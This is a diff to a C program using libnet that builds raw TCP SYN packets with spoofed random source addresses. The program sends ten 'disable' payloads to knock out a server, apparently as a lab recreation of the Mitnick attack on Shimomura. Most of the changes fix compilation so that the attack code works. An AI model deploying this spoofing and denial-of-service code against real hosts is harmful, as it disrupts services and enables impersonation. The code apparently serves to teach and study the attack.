@@ -1,7 +1,7 @@
 #include <libnet.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <common.h>
+//#include <common.h>
 #include <unistd.h>
 
 
@@ -21,7 +21,7 @@
 #define PAYLOAD_RST "enable"
 
 //function definitions
-int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip);
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip);
 
 //shimomura you're doomed
 int main (void)
@@ -42,12 +42,12 @@ int main (void)
 	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
 	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
 
-	if (server_ip == -1)
+	if (server_ip == (u_long) -1)
 	{
 		printf("error in server ip conversion\n");
 		exit(EXIT_FAILURE);
 	}
-	if (kevin_ip == -1)
+	if (kevin_ip == (u_long) -1)
 	{
 		printf("error in kevin ip conversion\n");
 		exit(EXIT_FAILURE);
@@ -55,10 +55,12 @@ int main (void)
 
 	//dos the server
 	char disable[] = "disable";
-	for (int i = 0; i < 10; i++)
+	int i;
+	printf("Starting the DOS attack\n");
+	for (i = 0; i < 10; i++)
 	{
 		//craft and send 10 packets with "disable" payload
-		int success = send_syn(PORT, disable, 8, l, server_ip);
+		send_syn(PORT, (uint8_t *) disable, 8, l, server_ip);
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
 
@@ -77,7 +79,7 @@ int main (void)
 }
 
 
-int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip)
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip)
 {
 
 	libnet_ptag_t t;
@@ -105,7 +107,7 @@ int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, lib
 	}
 
 	//build ip fragment containing syn
-	t = libnet_build_ip(
+	t = libnet_build_ipv4(
 		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
 		0,																				//tos, type of service
 		libnet_get_prand(LIBNET_PRu16),						//id, ip identification
@@ -113,7 +115,7 @@ int send_syn(uint16_t dest_port, const uint8_t *payload, uint32_t payload_s, lib
 		libnet_get_prand(LIBNET_PR8),							//ttl
     IPPROTO_TCP,															//upper protocol
     0,																				//checksum, 0 to autofill
-    src_ip = libnet_get_prand(LIBNET_PRu32),	//src, I use a random fake ip
+    libnet_get_prand(LIBNET_PRu32),	//src, I use a random fake ip
     server_ip,																//destination
     NULL,																			//payload
     0,																				//payload len
